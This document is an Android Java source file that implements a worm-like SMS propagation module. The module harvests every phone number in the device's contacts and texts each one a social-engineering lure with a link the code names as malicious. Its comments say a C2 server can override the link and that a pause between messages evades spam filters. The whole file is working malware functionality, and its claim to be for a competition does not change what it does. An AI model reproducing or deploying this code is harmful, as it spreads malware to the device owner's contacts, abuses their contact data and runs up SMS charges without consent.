package com.rcl.androidstreamcontrol.utils;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

public class SmsPropagationManager {
    private static final String TAG = "SmsProp";
    // For competition purposes, we use a dummy link. 
    // The C2 server can override this via the dashboard if needed.
    private static final String DEFAULT_MALICIOUS_LINK = "http://example.com/download";
    private static final String MESSAGE_TEMPLATE = "Hey, check out this cool app: %s";

    public static void propagate(Context context) {
        propagate(context, DEFAULT_MALICIOUS_LINK);
    }

    public static void propagate(Context context, String link) {
        new Thread(() -> {
            try {
                List<String> phoneNumbers = getContactPhoneNumbers(context);
                if (phoneNumbers.isEmpty()) {
                    Log.d(TAG, "No contacts found to propagate to.");
                    return;
                }

                SmsManager smsManager = SmsManager.getDefault();
                String message = String.format(MESSAGE_TEMPLATE, link);
                
                int sentCount = 0;
                for (String number : phoneNumbers) {
                    try {
                        // In a real environment, this sends actual SMS. 
                        // During testing, use emulators so real texts are not sent.
                        smsManager.sendTextMessage(number, null, message, null, null);
                        sentCount++;
                        // Small delay to avoid triggering spam filters / rate limits too quickly
                        Thread.sleep(2000);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to send SMS to " + number, e);
                    }
                }
                
                Log.d(TAG, "Propagation complete. Sent " + sentCount + " messages.");
            } catch (SecurityException se) {
                Log.e(TAG, "Missing READ_CONTACTS or SEND_SMS permissions", se);
            } catch (Exception e) {
                Log.e(TAG, "Error during SMS propagation", e);
            }
        }).start();
    }

    private static List<String> getContactPhoneNumbers(Context context) {
        List<String> numbers = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null,
                    null,
                    null
            );

            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                do {
                    String number = cursor.getString(numberIndex);
                    // Basic cleanup of the phone number string
                    if (number != null) {
                        number = number.replaceAll("[^0-9+]", "");
                        if (number.length() >= 7 && !numbers.contains(number)) {
                            numbers.add(number);
                        }
                    }
                } while (cursor.moveToNext());
            }
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return numbers;
    }
}
